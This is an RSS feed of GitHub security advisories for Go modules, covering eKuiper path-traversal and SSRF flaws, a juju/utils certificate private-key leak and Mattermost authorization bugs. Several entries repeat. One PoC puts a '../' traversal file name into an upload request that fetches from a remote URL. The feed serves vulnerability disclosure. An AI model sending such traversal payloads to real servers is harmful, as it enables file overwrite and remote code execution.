<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://xlordz.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2025-07-04T09:33:24.943Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/lf-edge/ekuiper] eKuiper /config/uploads API arbitrary file writing may lead to RCE]]></title>
        <id>https://github.com/advisories/GHSA-gj54-gwj9-x2c6</id>
        <link href="https://github.com/advisories/GHSA-gj54-gwj9-x2c6"/>
        <updated>2025-07-03T14:22:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>eKuiper /config/uploads API supports accessing remote web URLs and saving files in the local upload directory, but there are no security restrictions, resulting in arbitrary file writing through ../. If run with root privileges, RCE can be achieved by writing crontab files or ssh keys.</p>
<h3 id="details">Details</h3>
<pre><code class="language-go">func fileUploadHandler(w http.ResponseWriter, r *http.Request) {
    switch r.Method {
    // Upload or overwrite a file
    case http.MethodPost:
        switch r.Header.Get("Content-Type") {
        case "application/json":
            fc := &amp;fileContent{}
            defer r.Body.Close()
            err := json.NewDecoder(r.Body).Decode(fc)
            if err != nil {
                handleError(w, err, "Invalid body: Error decoding file json", logger)
                return
            }
            err = fc.Validate()
            if err != nil {
                handleError(w, err, "Invalid body: missing necessary field", logger)
                return
            }

            filePath := filepath.Join(uploadDir, fc.Name)
            err = upload(fc)
</code></pre>
<ul>
<li>The fc.Name parameter do not safely filtered.</li>
</ul>
<h3 id="poc">PoC</h3>
<pre><code>POST /config/uploads HTTP/1.1
Host: localhost:9081
Content-Type: application/json
Content-Length: 89

{
  "name": "../../../../tmp/success",
 "file": "http://192.168.65.254:8888/success"
}
</code></pre>
<p><img alt="image" src="https://github.com/user-attachments/assets/9ac23194-f5fd-49d3-ba54-334a7831739a"></p>
<h3 id="impact">Impact</h3>
<p>Tested and verified only on 1.14.3 and 1.14.1, theoretically all versions using this code could be affected.</p>
<ol>
<li>SSRF</li>
<li>Path-Travel</li>
<li>May leads to RCE</li>
</ol>
<p>The reporters is m0d9 from Tencent YunDing Lab.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lf-edge/ekuiper/security/advisories/GHSA-gj54-gwj9-x2c6">https://github.com/lf-edge/ekuiper/security/advisories/GHSA-gj54-gwj9-x2c6</a></li>
<li><a href="https://github.com/advisories/GHSA-gj54-gwj9-x2c6">https://github.com/advisories/GHSA-gj54-gwj9-x2c6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gj54-gwj9-x2c6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-07-03T14:22:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/lf-edge/ekuiper/v2] eKuiper /config/uploads API arbitrary file writing may lead to RCE]]></title>
        <id>https://github.com/advisories/GHSA-gj54-gwj9-x2c6</id>
        <link href="https://github.com/advisories/GHSA-gj54-gwj9-x2c6"/>
        <updated>2025-07-03T14:22:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>eKuiper /config/uploads API supports accessing remote web URLs and saving files in the local upload directory, but there are no security restrictions, resulting in arbitrary file writing through ../. If run with root privileges, RCE can be achieved by writing crontab files or ssh keys.</p>
<h3 id="details">Details</h3>
<pre><code class="language-go">func fileUploadHandler(w http.ResponseWriter, r *http.Request) {
    switch r.Method {
    // Upload or overwrite a file
    case http.MethodPost:
        switch r.Header.Get("Content-Type") {
        case "application/json":
            fc := &amp;fileContent{}
            defer r.Body.Close()
            err := json.NewDecoder(r.Body).Decode(fc)
            if err != nil {
                handleError(w, err, "Invalid body: Error decoding file json", logger)
                return
            }
            err = fc.Validate()
            if err != nil {
                handleError(w, err, "Invalid body: missing necessary field", logger)
                return
            }

            filePath := filepath.Join(uploadDir, fc.Name)
            err = upload(fc)
</code></pre>
<ul>
<li>The fc.Name parameter do not safely filtered.</li>
</ul>
<h3 id="poc">PoC</h3>
<pre><code>POST /config/uploads HTTP/1.1
Host: localhost:9081
Content-Type: application/json
Content-Length: 89

{
  "name": "../../../../tmp/success",
 "file": "http://192.168.65.254:8888/success"
}
</code></pre>
<p><img alt="image" src="https://github.com/user-attachments/assets/9ac23194-f5fd-49d3-ba54-334a7831739a"></p>
<h3 id="impact">Impact</h3>
<p>Tested and verified only on 1.14.3 and 1.14.1, theoretically all versions using this code could be affected.</p>
<ol>
<li>SSRF</li>
<li>Path-Travel</li>
<li>May leads to RCE</li>
</ol>
<p>The reporters is m0d9 from Tencent YunDing Lab.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lf-edge/ekuiper/security/advisories/GHSA-gj54-gwj9-x2c6">https://github.com/lf-edge/ekuiper/security/advisories/GHSA-gj54-gwj9-x2c6</a></li>
<li><a href="https://github.com/advisories/GHSA-gj54-gwj9-x2c6">https://github.com/advisories/GHSA-gj54-gwj9-x2c6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-gj54-gwj9-x2c6</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-07-03T14:22:05.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/lf-edge/ekuiper] LF Edge eKuiper vulnerable to File Path Traversal leading to file replacement]]></title>
        <id>https://github.com/advisories/GHSA-fv2p-qj5p-wqq4</id>
        <link href="https://github.com/advisories/GHSA-fv2p-qj5p-wqq4"/>
        <updated>2025-07-03T14:18:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Path traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. In this case, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.</p>
<h3 id="details">Details</h3>
<p>The file handler function trusts the filename provided by the user. This includes the cases when the user uses a path instead of the filename. This makes possible to write arbitrary files to the system and <strong>replace</strong> the files owned by <em>kuiper</em> user on the filesystem. The vulnerable function is <code>fileUploadHandler</code> which is shown below:</p>
<p><a href="https://github.com/lf-edge/ekuiper/blob/1e6b6b6601445eb05316532f5fbef7f0a863ecfe/internal/server/rest.go#L329-L359">https://github.com/lf-edge/ekuiper/blob/1e6b6b6601445eb05316532f5fbef7f0a863ecfe/internal/server/rest.go#L329-L359</a></p>
<p>Exploitation of this vulnerability allows an attacker to rewrite the files owned by ekuiper including the main kuiper binaries as they are owned by <em>kuiper</em> user:</p>
<p><img alt="kuiper binaries" src="https://github.com/user-attachments/assets/58cf0dc9-20aa-4976-b199-d052a8f5a676"></p>
<h3 id="poc">PoC</h3>
<ol start="0">
<li>The files should be uploaded to <code>/kuiper/data/uploads</code> directory. So let's move to the <code>/kuiper/data</code>, examine the existing files and create an empty <code>traversal-poc</code> file owned by  <em>kuiper</em>:</li>
</ol>
<p><img alt="Preparation" src="https://github.com/user-attachments/assets/c1010cfe-ca3e-481d-b895-820a96f2af60"></p>
<ol>
<li>Now, we can go to <em>Services &gt; Configuration &gt; File Management</em> and try to upload file with name <code>../test</code>:</li>
</ol>
<p><img alt="GUI" src="https://github.com/user-attachments/assets/31402874-d8a1-450b-91d6-025533c7be33"></p>
<p><img alt="Request in Burp" src="https://github.com/user-attachments/assets/a4b01f57-5ce0-4791-8a6e-69eb47bca40b"></p>
<p>In the response we can see the path of the uploaded file and can assume that the traversal worked.</p>
<ol start="2">
<li>Now we can try to change the <code>traversal-poc</code> file that we know exists on the server. It can be made with the following request:</li>
</ol>
<p><img alt="traversal-poc change" src="https://github.com/user-attachments/assets/164a7088-9152-4a6d-bef4-de8b4637ed51"></p>
<ol start="3">
<li>Now, if we look at the server, we can see the file created in the traversed directory and the replaced poc-file:</li>
</ol>
<p><img alt="Changed files" src="https://github.com/user-attachments/assets/1be0bb36-66b7-4552-9b5d-6298c15d59bb"></p>
<h3 id="impact">Impact</h3>
<ul>
<li>Possibility to upload files to external directories;</li>
<li>Possibility to rewrite any file owned by <em>kuiper</em> user on the filesystem.</li>
</ul>
<p>Reported by Alexey Kosmachev, Lead Pentester from Bi.Zone</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lf-edge/ekuiper/security/advisories/GHSA-fv2p-qj5p-wqq4">https://github.com/lf-edge/ekuiper/security/advisories/GHSA-fv2p-qj5p-wqq4</a></li>
<li><a href="https://github.com/lf-edge/ekuiper/blob/1e6b6b6601445eb05316532f5fbef7f0a863ecfe/internal/server/rest.go#L329-L359">https://github.com/lf-edge/ekuiper/blob/1e6b6b6601445eb05316532f5fbef7f0a863ecfe/internal/server/rest.go#L329-L359</a></li>
<li><a href="https://github.com/advisories/GHSA-fv2p-qj5p-wqq4">https://github.com/advisories/GHSA-fv2p-qj5p-wqq4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fv2p-qj5p-wqq4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-07-03T14:18:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/lf-edge/ekuiper/v2] LF Edge eKuiper vulnerable to File Path Traversal leading to file replacement]]></title>
        <id>https://github.com/advisories/GHSA-fv2p-qj5p-wqq4</id>
        <link href="https://github.com/advisories/GHSA-fv2p-qj5p-wqq4"/>
        <updated>2025-07-03T14:18:05.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Path traversal is also known as directory traversal. These vulnerabilities enable an attacker to read arbitrary files on the server that is running an application. In this case, an attacker might be able to write to arbitrary files on the server, allowing them to modify application data or behavior, and ultimately take full control of the server.</p>
<h3 id="details">Details</h3>
<p>The file handler function trusts the filename provided by the user. This includes the cases when the user uses a path instead of the filename. This makes possible to write arbitrary files to the system and <strong>replace</strong> the files owned by <em>kuiper</em> user on the filesystem. The vulnerable function is <code>fileUploadHandler</code> which is shown below:</p>
<p><a href="https://github.com/lf-edge/ekuiper/blob/1e6b6b6601445eb05316532f5fbef7f0a863ecfe/internal/server/rest.go#L329-L359">https://github.com/lf-edge/ekuiper/blob/1e6b6b6601445eb05316532f5fbef7f0a863ecfe/internal/server/rest.go#L329-L359</a></p>
<p>Exploitation of this vulnerability allows an attacker to rewrite the files owned by ekuiper including the main kuiper binaries as they are owned by <em>kuiper</em> user:</p>
<p><img alt="kuiper binaries" src="https://github.com/user-attachments/assets/58cf0dc9-20aa-4976-b199-d052a8f5a676"></p>
<h3 id="poc">PoC</h3>
<ol start="0">
<li>The files should be uploaded to <code>/kuiper/data/uploads</code> directory. So let's move to the <code>/kuiper/data</code>, examine the existing files and create an empty <code>traversal-poc</code> file owned by  <em>kuiper</em>:</li>
</ol>
<p><img alt="Preparation" src="https://github.com/user-attachments/assets/c1010cfe-ca3e-481d-b895-820a96f2af60"></p>
<ol>
<li>Now, we can go to <em>Services &gt; Configuration &gt; File Management</em> and try to upload file with name <code>../test</code>:</li>
</ol>
<p><img alt="GUI" src="https://github.com/user-attachments/assets/31402874-d8a1-450b-91d6-025533c7be33"></p>
<p><img alt="Request in Burp" src="https://github.com/user-attachments/assets/a4b01f57-5ce0-4791-8a6e-69eb47bca40b"></p>
<p>In the response we can see the path of the uploaded file and can assume that the traversal worked.</p>
<ol start="2">
<li>Now we can try to change the <code>traversal-poc</code> file that we know exists on the server. It can be made with the following request:</li>
</ol>
<p><img alt="traversal-poc change" src="https://github.com/user-attachments/assets/164a7088-9152-4a6d-bef4-de8b4637ed51"></p>
<ol start="3">
<li>Now, if we look at the server, we can see the file created in the traversed directory and the replaced poc-file:</li>
</ol>
<p><img alt="Changed files" src="https://github.com/user-attachments/assets/1be0bb36-66b7-4552-9b5d-6298c15d59bb"></p>
<h3 id="impact">Impact</h3>
<ul>
<li>Possibility to upload files to external directories;</li>
<li>Possibility to rewrite any file owned by <em>kuiper</em> user on the filesystem.</li>
</ul>
<p>Reported by Alexey Kosmachev, Lead Pentester from Bi.Zone</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lf-edge/ekuiper/security/advisories/GHSA-fv2p-qj5p-wqq4">https://github.com/lf-edge/ekuiper/security/advisories/GHSA-fv2p-qj5p-wqq4</a></li>
<li><a href="https://github.com/lf-edge/ekuiper/blob/1e6b6b6601445eb05316532f5fbef7f0a863ecfe/internal/server/rest.go#L329-L359">https://github.com/lf-edge/ekuiper/blob/1e6b6b6601445eb05316532f5fbef7f0a863ecfe/internal/server/rest.go#L329-L359</a></li>
<li><a href="https://github.com/advisories/GHSA-fv2p-qj5p-wqq4">https://github.com/advisories/GHSA-fv2p-qj5p-wqq4</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fv2p-qj5p-wqq4</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-07-03T14:18:04.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/juju/utils/v4/cert] juju/utils leaks private key in certs]]></title>
        <id>https://github.com/advisories/GHSA-h34r-jxqm-qgpr</id>
        <link href="https://github.com/advisories/GHSA-h34r-jxqm-qgpr"/>
        <updated>2025-07-01T17:35:18.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Certs generated by v4 contain their private key.</p>
<h2 id="details">Details</h2>
<h3 id="background">Background</h3>
<p>Recently, I encountered an API in Go that’s easy to misuse: sha512.Sum384 and sha512.New384().Sum look very similar and behave very differently. <a href="https://go.dev/play/p/kDCqqoYk84k">https://go.dev/play/p/kDCqqoYk84k</a> demonstrates this. I want to discuss extending static analysis to detect this case with the go community, but before I do that, I want to make a best-effort pass at open-source projects to fix the existing bugs. I figured that if there were any vulnerabilities out there, they would be easy to find once that discussion begins, so it’s better to address them early. </p>
<p>This work is a hobby project and has no affiliation with my employer, so I may be slow to respond due to existing commitments. </p>
<h3 id="poc">PoC</h3>
<p><a href="https://go.dev/play/p/vSW0U3Hq4qk">https://go.dev/play/p/vSW0U3Hq4qk</a></p>
<h3 id="impact">Impact</h3>
<p><a href="https://github.com/juju/utils/blob/0141ef0ee74a0cac603c5c9e4aff194008722f41/cert/cert.go#L120">This code</a> (cert.NewLeaf) generates certs with the SubjectKeyId set to <code>sha512.New384().Sum(/* private */ key)</code>.</p>
<p>If a cert which was generated by cert.NewLeaf is transferred over the network in plaintext, as is often the case in TLS handshakes, an attacker listening on that network may sniff the cert and trivially extract the private key from it. This applies to client and server TLS certs generated by vulnerable versions of this library.</p>
<p>Getting the server cert and its key would only require performing a TLS handshake (with a matching SNI) with the server. At that point, the attacker could impersonate the server.</p>
<p>Similarly, getting the client cert and its key would require getting the client to perform a TLS handshake against an attacker-controlled server. At that point, an attacker could impersonate the client.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/juju/utils/security/advisories/GHSA-h34r-jxqm-qgpr">https://github.com/juju/utils/security/advisories/GHSA-h34r-jxqm-qgpr</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-6224">https://nvd.nist.gov/vuln/detail/CVE-2025-6224</a></li>
<li><a href="https://github.com/juju/utils/commit/766f27d7bcd10433453a9764509a864c17a46a76">https://github.com/juju/utils/commit/766f27d7bcd10433453a9764509a864c17a46a76</a></li>
<li><a href="https://github.com/juju/utils/releases/tag/v4.0.4">https://github.com/juju/utils/releases/tag/v4.0.4</a></li>
<li><a href="https://github.com/advisories/GHSA-h34r-jxqm-qgpr">https://github.com/advisories/GHSA-h34r-jxqm-qgpr</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-h34r-jxqm-qgpr</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-07-01T17:35:16.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-wgvp-jj4w-88hf</id>
        <link href="https://github.com/advisories/GHSA-wgvp-jj4w-88hf"/>
        <updated>2025-06-30T20:40:42.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.5, 9.11.x &lt;= 9.11.15, 10.8.x &lt;= 10.8.0, 10.7.x &lt;= 10.7.2, 10.6.x &lt;= 10.6.5 fail to properly validate channel membership when retrieving playbook run metadata, allowing authenticated users who are playbook members but not channel members to access sensitive information about linked private channels including channel name, display name, and participant count through the run metadata API endpoint.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47871">https://nvd.nist.gov/vuln/detail/CVE-2025-47871</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-wgvp-jj4w-88hf">https://github.com/advisories/GHSA-wgvp-jj4w-88hf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wgvp-jj4w-88hf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-30T18:31:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-wgvp-jj4w-88hf</id>
        <link href="https://github.com/advisories/GHSA-wgvp-jj4w-88hf"/>
        <updated>2025-06-30T20:40:42.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.5, 9.11.x &lt;= 9.11.15, 10.8.x &lt;= 10.8.0, 10.7.x &lt;= 10.7.2, 10.6.x &lt;= 10.6.5 fail to properly validate channel membership when retrieving playbook run metadata, allowing authenticated users who are playbook members but not channel members to access sensitive information about linked private channels including channel name, display name, and participant count through the run metadata API endpoint.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47871">https://nvd.nist.gov/vuln/detail/CVE-2025-47871</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-wgvp-jj4w-88hf">https://github.com/advisories/GHSA-wgvp-jj4w-88hf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wgvp-jj4w-88hf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-30T18:31:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-wgvp-jj4w-88hf</id>
        <link href="https://github.com/advisories/GHSA-wgvp-jj4w-88hf"/>
        <updated>2025-06-30T20:40:42.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.5, 9.11.x &lt;= 9.11.15, 10.8.x &lt;= 10.8.0, 10.7.x &lt;= 10.7.2, 10.6.x &lt;= 10.6.5 fail to properly validate channel membership when retrieving playbook run metadata, allowing authenticated users who are playbook members but not channel members to access sensitive information about linked private channels including channel name, display name, and participant count through the run metadata API endpoint.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47871">https://nvd.nist.gov/vuln/detail/CVE-2025-47871</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-wgvp-jj4w-88hf">https://github.com/advisories/GHSA-wgvp-jj4w-88hf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wgvp-jj4w-88hf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-30T18:31:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-wgvp-jj4w-88hf</id>
        <link href="https://github.com/advisories/GHSA-wgvp-jj4w-88hf"/>
        <updated>2025-06-30T20:40:42.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.5, 9.11.x &lt;= 9.11.15, 10.8.x &lt;= 10.8.0, 10.7.x &lt;= 10.7.2, 10.6.x &lt;= 10.6.5 fail to properly validate channel membership when retrieving playbook run metadata, allowing authenticated users who are playbook members but not channel members to access sensitive information about linked private channels including channel name, display name, and participant count through the run metadata API endpoint.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47871">https://nvd.nist.gov/vuln/detail/CVE-2025-47871</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-wgvp-jj4w-88hf">https://github.com/advisories/GHSA-wgvp-jj4w-88hf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wgvp-jj4w-88hf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-30T18:31:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-wgvp-jj4w-88hf</id>
        <link href="https://github.com/advisories/GHSA-wgvp-jj4w-88hf"/>
        <updated>2025-06-30T20:40:42.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.5, 9.11.x &lt;= 9.11.15, 10.8.x &lt;= 10.8.0, 10.7.x &lt;= 10.7.2, 10.6.x &lt;= 10.6.5 fail to properly validate channel membership when retrieving playbook run metadata, allowing authenticated users who are playbook members but not channel members to access sensitive information about linked private channels including channel name, display name, and participant count through the run metadata API endpoint.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47871">https://nvd.nist.gov/vuln/detail/CVE-2025-47871</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-wgvp-jj4w-88hf">https://github.com/advisories/GHSA-wgvp-jj4w-88hf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wgvp-jj4w-88hf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-30T18:31:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-wgvp-jj4w-88hf</id>
        <link href="https://github.com/advisories/GHSA-wgvp-jj4w-88hf"/>
        <updated>2025-06-30T20:40:42.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.5, 9.11.x &lt;= 9.11.15, 10.8.x &lt;= 10.8.0, 10.7.x &lt;= 10.7.2, 10.6.x &lt;= 10.6.5 fail to properly validate channel membership when retrieving playbook run metadata, allowing authenticated users who are playbook members but not channel members to access sensitive information about linked private channels including channel name, display name, and participant count through the run metadata API endpoint.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47871">https://nvd.nist.gov/vuln/detail/CVE-2025-47871</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-wgvp-jj4w-88hf">https://github.com/advisories/GHSA-wgvp-jj4w-88hf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wgvp-jj4w-88hf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-30T18:31:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost-server] Mattermost Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-wgvp-jj4w-88hf</id>
        <link href="https://github.com/advisories/GHSA-wgvp-jj4w-88hf"/>
        <updated>2025-06-30T20:40:42.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.5, 9.11.x &lt;= 9.11.15, 10.8.x &lt;= 10.8.0, 10.7.x &lt;= 10.7.2, 10.6.x &lt;= 10.6.5 fail to properly validate channel membership when retrieving playbook run metadata, allowing authenticated users who are playbook members but not channel members to access sensitive information about linked private channels including channel name, display name, and participant count through the run metadata API endpoint.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47871">https://nvd.nist.gov/vuln/detail/CVE-2025-47871</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/advisories/GHSA-wgvp-jj4w-88hf">https://github.com/advisories/GHSA-wgvp-jj4w-88hf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-wgvp-jj4w-88hf</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-30T18:31:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-v8fr-vxmw-6mf6</id>
        <link href="https://github.com/advisories/GHSA-v8fr-vxmw-6mf6"/>
        <updated>2025-06-30T20:40:34.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.5, 9.11.x &lt;= 9.11.15, 10.8.x &lt;= 10.8.0, 10.7.x &lt;= 10.7.2, 10.6.x &lt;= 10.6.5 fail to properly enforce channel member management permissions when adding participants to playbook runs. This allows authenticated users with member-level permissions to bypass system admin restrictions and add or remove users to/from private channels via the playbook run participants feature, even when the 'Manage Members' permission has been explicitly removed. This can lead to unauthorized access to sensitive channel content and allow guest users to gain channel management privileges.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46702">https://nvd.nist.gov/vuln/detail/CVE-2025-46702</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/mattermost/mattermost/commit/31142f101e3cce6171e2b6cb4980a1aa8eaefae0">https://github.com/mattermost/mattermost/commit/31142f101e3cce6171e2b6cb4980a1aa8eaefae0</a></li>
<li><a href="https://github.com/mattermost/mattermost/commit/4ae5d647fb8893d77dccbb57d114855939a775ce">https://github.com/mattermost/mattermost/commit/4ae5d647fb8893d77dccbb57d114855939a775ce</a></li>
<li><a href="https://github.com/advisories/GHSA-v8fr-vxmw-6mf6">https://github.com/advisories/GHSA-v8fr-vxmw-6mf6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v8fr-vxmw-6mf6</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-06-30T18:31:50.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mattermost/mattermost/server/v8] Mattermost Incorrect Authorization vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-v8fr-vxmw-6mf6</id>
        <link href="https://github.com/advisories/GHSA-v8fr-vxmw-6mf6"/>
        <updated>2025-06-30T20:40:34.000Z</updated>
        <content type="html"><![CDATA[<p>Mattermost versions 10.5.x &lt;= 10.5.5, 9.11.x &lt;= 9.11.15, 10.8.x &lt;= 10.8.0, 10.7.x &lt;= 10.7.2, 10.6.x &lt;= 10.6.5 fail to properly enforce channel member management permissions when adding participants to playbook runs. This allows authenticated users with member-level permissions to bypass system admin restrictions and add or remove users to/from private channels via the playbook run participants feature, even when the 'Manage Members' permission has been explicitly removed. This can lead to unauthorized access to sensitive channel content and allow guest users to gain channel management privileges.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-46702">https://nvd.nist.gov/vuln/detail/CVE-2025-46702</a></li>
<li><a href="https://mattermost.com/security-updates">https://mattermost.com/security-updates</a></li>
<li><a href="https://github.com/mattermost/mattermost/commit/31142f101e3cce6171e2b6cb4980a1aa8eaefae0">https://github.com/mattermost/mattermost/commit/31142f101e3cce6171e2b6cb4980a1aa8eaefae0</a></li>
<li><a href="https://github.com/mattermost/mattermost/commit/4ae5d647fb8893d77dccbb57d114855939a775ce">https://github.com/mattermost/mattermost/commit/4ae5d647fb8893d77dccbb57d114855939a775ce</a></li>
<li><a href="https://github.com/advisories/GHSA-v8fr-vxmw-6mf6">https://github.com/advisories/GHSA-v8fr-vxmw-6mf6</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-v8fr-vxmw-6mf6</uri>
        </author>
